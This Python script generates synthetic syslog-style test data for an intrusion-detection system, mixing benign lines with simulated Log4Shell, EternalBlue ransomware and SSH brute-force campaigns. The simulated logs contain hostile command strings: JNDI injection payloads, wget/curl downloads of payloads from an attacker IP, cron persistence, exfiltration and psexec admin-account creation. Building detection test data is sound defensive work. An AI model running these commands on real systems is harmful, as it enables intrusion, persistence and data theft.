#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
generate_realistic_raw_logs.py
--------------------------------------------------------
Generate realistic raw logs WITHOUT embedded CVE labels

This simulates REAL-WORLD logs where:
- No 'cve' field
- No 'category' field
- No 'stage' field
- Only actual log text that the system must detect

The V3 system must identify attacks SOLELY from log content.
"""

import json
import random
from datetime import datetime, timedelta
from pathlib import Path


class RealisticLogGenerator:
    """Generate realistic raw logs like you'd see from syslog/SIEM"""

    def __init__(self):
        self.benign_patterns = [
            "sshd[{pid}]: Accepted publickey for {user} from {ip} port {port} ssh2: RSA",
            "nginx: {ip} - - [{time}] \"GET {path} HTTP/1.1\" 200 {bytes}",
            "kernel: [UFW ALLOW] IN=eth0 OUT= MAC= SRC={ip} DST={dst} PROTO=TCP DPT={port}",
            "systemd[1]: Started {service}.service",
            "postgres[{pid}]: LOG:  duration: {ms} ms  statement: SELECT * FROM users WHERE id={id}",
            "apache2: {ip} - {user} [{time}] \"POST /api/login HTTP/1.1\" 200 {bytes}",
            "cron[{pid}]: ({user}) CMD (/usr/bin/backup.sh)",
            "sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/systemctl restart {service}",
        ]

        self.users = ["alice", "bob", "charlie", "david", "emma", "frank"]
        self.services = ["nginx", "postgresql", "redis", "docker", "apache2"]

    def generate_benign(self, timestamp: datetime) -> dict:
        """Generate a realistic benign log"""
        pattern = random.choice(self.benign_patterns)

        log_text = pattern.format(
            pid=random.randint(1000, 9999),
            user=random.choice(self.users),
            ip=f"192.168.{random.randint(1,255)}.{random.randint(1,255)}",
            dst=f"10.0.{random.randint(1,255)}.{random.randint(1,255)}",
            port=random.choice([22, 80, 443, 3306, 5432, 6379]),
            time=timestamp.strftime("%d/%b/%Y:%H:%M:%S"),
            path=random.choice(["/", "/api/status", "/login", "/dashboard", "/api/users"]),
            bytes=random.randint(100, 5000),
            service=random.choice(self.services),
            ms=random.randint(1, 100),
            id=random.randint(1, 1000)
        )

        return {
            "timestamp": timestamp.isoformat(),
            "host": f"web-server-{random.randint(1, 5)}",
            "source_ip": f"192.168.{random.randint(1,255)}.{random.randint(1,255)}",
            "text": log_text
        }

    def generate_log4shell_attack(self, timestamp: datetime, attacker_ip: str, target: str) -> list:
        """Generate Log4Shell attack logs (CVE-2021-44228) - NO LABELS"""
        logs = []

        # Stage 1: JNDI injection attempts (reconnaissance)
        jndi_payloads = [
            f"nginx: {attacker_ip} - - [{timestamp.strftime('%d/%b/%Y:%H:%M:%S')}] \"GET /api/search?query=${{jndi:ldap://{attacker_ip}:1389/Exploit}} HTTP/1.1\" 200 1234",
            f"apache2: {attacker_ip} - - [{timestamp.strftime('%d/%b/%Y:%H:%M:%S')}] \"POST /login username=${{jndi:rmi://{attacker_ip}/shell}} HTTP/1.1\" 200 456",
            f"tomcat: {attacker_ip} [{timestamp.strftime('%d/%b/%Y:%H:%M:%S')}] ${{jndi:dns://{attacker_ip}/callback}} detected in User-Agent header",
        ]

        for payload in jndi_payloads:
            logs.append({
                "timestamp": timestamp.isoformat(),
                "host": target,
                "source_ip": attacker_ip,
                "text": payload
            })
            timestamp += timedelta(minutes=random.randint(5, 30))

        # Stage 2: Command execution (after 1-3 days)
        timestamp += timedelta(days=random.randint(1, 3))

        exec_logs = [
            f"java[{random.randint(1000,9999)}]: Runtime.exec() called: /bin/bash -c wget http://{attacker_ip}:8080/payload.sh",
            f"catalina.out: ProcessBuilder executing: curl http://{attacker_ip}/backdoor.elf -o /tmp/.hidden",
            f"java.lang.Process: Command execution: /bin/sh -c chmod +x /tmp/.hidden && /tmp/.hidden",
        ]

        for exec_log in exec_logs:
            logs.append({
                "timestamp": timestamp.isoformat(),
                "host": target,
                "source_ip": "127.0.0.1",
                "text": exec_log
            })
            timestamp += timedelta(minutes=random.randint(10, 60))

        # Stage 3: Persistence (after 5-10 days)
        timestamp += timedelta(days=random.randint(5, 10))

        persist_logs = [
            f"cron[{random.randint(1000,9999)}]: (root) CMD (echo '*/5 * * * * /tmp/.hidden' | crontab -)",
            f"systemd[1]: Created symlink /etc/systemd/system/multi-user.target.wants/malicious.service",
            f"audit: type=CONFIG_CHANGE msg=audit({int(timestamp.timestamp())}): user pid={random.randint(1000,9999)} auid=0 added cron job",
        ]

        for persist in persist_logs:
            logs.append({
                "timestamp": timestamp.isoformat(),
                "host": target,
                "source_ip": "127.0.0.1",
                "text": persist
            })
            timestamp += timedelta(hours=random.randint(1, 6))

        # Stage 4: Exfiltration (after 7-14 days)
        timestamp += timedelta(days=random.randint(7, 14))

        exfil_logs = [
            f"netstat: tcp        0      0 {target}:45678        {attacker_ip}:443         ESTABLISHED",
            f"audit: type=NETFILTER_CFG msg=audit({int(timestamp.timestamp())}): outbound connection to {attacker_ip}:443",
            f"tcpdump: {timestamp.strftime('%H:%M:%S')} IP {target}.45678 > {attacker_ip}.443: POST /exfil HTTP/1.1, length 52428800",
        ]

        for exfil in exfil_logs:
            logs.append({
                "timestamp": timestamp.isoformat(),
                "host": target,
                "source_ip": target,
                "text": exfil
            })
            timestamp += timedelta(hours=random.randint(1, 4))

        return logs

    def generate_eternalblue_attack(self, timestamp: datetime, attacker_ip: str, target: str) -> list:
        """Generate EternalBlue/Ransomware attack (CVE-2017-0144) - NO LABELS"""
        logs = []

        # Stage 1: SMB exploitation
        smb_logs = [
            f"smbd[{random.randint(1000,9999)}]: Connection from {attacker_ip} to IPC$",
            f"kernel: SMB: NT_STATUS_INSUFF_SERVER_RESOURCES from {attacker_ip}",
            f"smbd: Multiple failed authentication attempts from {attacker_ip} using SMB1 protocol",
            f"audit: type=AVC msg=audit({int(timestamp.timestamp())}): SMB exploit attempt from {attacker_ip}",
        ]

        for smb in smb_logs:
            logs.append({
                "timestamp": timestamp.isoformat(),
                "host": target,
                "source_ip": attacker_ip,
                "text": smb
            })
            timestamp += timedelta(minutes=random.randint(2, 10))

        # Stage 2: Remote execution (after 12-48 hours)
        timestamp += timedelta(hours=random.randint(12, 48))

        exec_logs = [
            f"psexec: \\\\{target} cmd.exe /c net user hacker P@ssw0rd /add",
            f"wmic: Process call create on {target}: cmd.exe /c whoami",
            f"audit: type=USER_CMD msg=audit({int(timestamp.timestamp())}): user=SYSTEM cmd=net localgroup administrators hacker /add",
        ]

        for exec_log in exec_logs:
            logs.append({
                "timestamp": timestamp.isoformat(),
                "host": target,
                "source_ip": "127.0.0.1",
                "text": exec_log
            })
            timestamp += timedelta(minutes=random.randint(5, 20))

        # Stage 3: Ransomware encryption (after 2-5 days)
        timestamp += timedelta(days=random.randint(2, 5))

        ransom_logs = [
            f"kernel: filesystem: /home/documents/file{random.randint(1,1000)}.docx renamed to /home/documents/file{random.randint(1,1000)}.docx.locked",
            f"audit: type=PATH msg=audit({int(timestamp.timestamp())}): 1500 files modified in /home",
            f"cat /home/README_DECRYPT.txt: Your files have been encrypted. Pay 0.5 BTC to wallet: {random.randbytes(16).hex()}",
            f"dmesg: [crypto] AES-256 encryption operations: 15000 files processed",
        ]

        for ransom in ransom_logs:
            logs.append({
                "timestamp": timestamp.isoformat(),
                "host": target,
                "source_ip": "127.0.0.1",
                "text": ransom
            })
            timestamp += timedelta(seconds=random.randint(1, 30))

        return logs

    def generate_ssh_bruteforce_attack(self, timestamp: datetime, attacker_ip: str, target: str) -> list:
        """Generate realistic SSH bruteforce (CVE-2024-6387) - NO LABELS"""
        logs = []

        # Multiple failed attempts
        for i in range(random.randint(10, 30)):
            logs.append({
                "timestamp": timestamp.isoformat(),
                "host": target,
                "source_ip": attacker_ip,
                "text": f"sshd[{random.randint(10000,20000)}]: Failed password for invalid user admin from {attacker_ip} port {random.randint(40000,60000)} ssh2"
            })
            timestamp += timedelta(seconds=random.randint(1, 5))

        # SIGALRM crashes (CVE-2024-6387 signature)
        for i in range(random.randint(5, 10)):
            pid = random.randint(10000, 20000)
            logs.append({
                "timestamp": timestamp.isoformat(),
                "host": target,
                "source_ip": attacker_ip,
                "text": f"sshd[{pid}]: SIGALRM received during authentication from {attacker_ip}"
            })
            timestamp += timedelta(seconds=2)

            logs.append({
                "timestamp": timestamp.isoformat(),
                "host": target,
                "source_ip": attacker_ip,
                "text": f"kernel: sshd[{pid}]: segfault at 7fff8badc000 ip 00007f9abc123456 sp 00007fff8badc000 error 4"
            })
            timestamp += timedelta(seconds=random.randint(5, 15))

        # Successful compromise
        timestamp += timedelta(hours=random.randint(1, 4))
        logs.append({
            "timestamp": timestamp.isoformat(),
            "host": target,
            "source_ip": attacker_ip,
            "text": f"sshd[{random.randint(10000,20000)}]: Accepted password for root from {attacker_ip} port {random.randint(40000,60000)} ssh2"
        })

        return logs


def generate_realistic_dataset(output_path: str, num_logs: int = 100000, num_attacks: int = 10):
    """
    Generate realistic raw logs

    Args:
        output_path: Output file path
        num_logs: Total number of logs
        num_attacks: Number of attacks to embed
    """
    print(f"\n{'='*70}")
    print(f"REALISTIC RAW LOG GENERATOR")
    print(f"{'='*70}")
    print(f"Total logs: {num_logs:,}")
    print(f"Attacks: {num_attacks}")
    print(f"NO EMBEDDED CVE LABELS - Pure detection test")
    print(f"Output: {output_path}")
    print(f"{'='*70}\n")

    gen = RealisticLogGenerator()
    start_date = datetime(2024, 1, 1)

    # Generate attacks
    print("Generating attack campaigns...")
    all_attack_logs = []
    attack_types = []

    for i in range(num_attacks):
        attack_type = random.choice(['log4shell', 'eternalblue', 'ssh_bruteforce'])
        attacker_ip = f"45.67.{random.randint(1,255)}.{random.randint(1,255)}"
        target = f"web-server-{random.randint(1,10)}"
        attack_start = start_date + timedelta(days=random.randint(0, 90))

        if attack_type == 'log4shell':
            attack_logs = gen.generate_log4shell_attack(attack_start, attacker_ip, target)
            attack_types.append(('Log4Shell', len(attack_logs)))
        elif attack_type == 'eternalblue':
            attack_logs = gen.generate_eternalblue_attack(attack_start, attacker_ip, target)
            attack_types.append(('EternalBlue', len(attack_logs)))
        else:
            attack_logs = gen.generate_ssh_bruteforce_attack(attack_start, attacker_ip, target)
            attack_types.append(('SSH/CVE-2024-6387', len(attack_logs)))

        all_attack_logs.extend(attack_logs)

    print(f"Generated {len(all_attack_logs)} attack logs:")
    for attack_type, count in attack_types:
        print(f"  • {attack_type}: {count} events")

    # Generate benign logs
    print(f"\nGenerating {num_logs - len(all_attack_logs):,} benign logs...")
    all_logs = list(all_attack_logs)

    for i in range(num_logs - len(all_attack_logs)):
        timestamp = start_date + timedelta(seconds=i * 10)
        all_logs.append(gen.generate_benign(timestamp))

    # Sort by timestamp
    all_logs.sort(key=lambda x: x['timestamp'])

    # Write to file (JSON lines format for streaming)
    print(f"\nWriting to {output_path}...")
    Path(output_path).parent.mkdir(parents=True, exist_ok=True)

    with open(output_path, 'w') as f:
        for log in all_logs:
            f.write(json.dumps(log) + '\n')

    print(f"\n{'='*70}")
    print("GENERATION COMPLETE")
    print(f"{'='*70}")
    print(f"Total logs: {len(all_logs):,}")
    print(f"Attack logs: {len(all_attack_logs)} ({len(all_attack_logs)/len(all_logs)*100:.3f}%)")
    print(f"File size: {Path(output_path).stat().st_size / (1024*1024):.2f} MB")
    print(f"\n⚠️  NO CVE LABELS - System must detect from log content only!")
    print(f"{'='*70}\n")


def main():
    """Main entry point"""
    import argparse

    parser = argparse.ArgumentParser(description='Generate realistic raw logs')
    parser.add_argument('--size', type=int, default=100000,
                       help='Number of logs (default: 100,000)')
    parser.add_argument('--attacks', type=int, default=10,
                       help='Number of attacks (default: 10)')
    parser.add_argument('--output', type=str,
                       default='data/test_logs/realistic_raw_logs.jsonl',
                       help='Output file')

    args = parser.parse_args()

    generate_realistic_dataset(args.output, args.size, args.attacks)


if __name__ == '__main__':
    main()
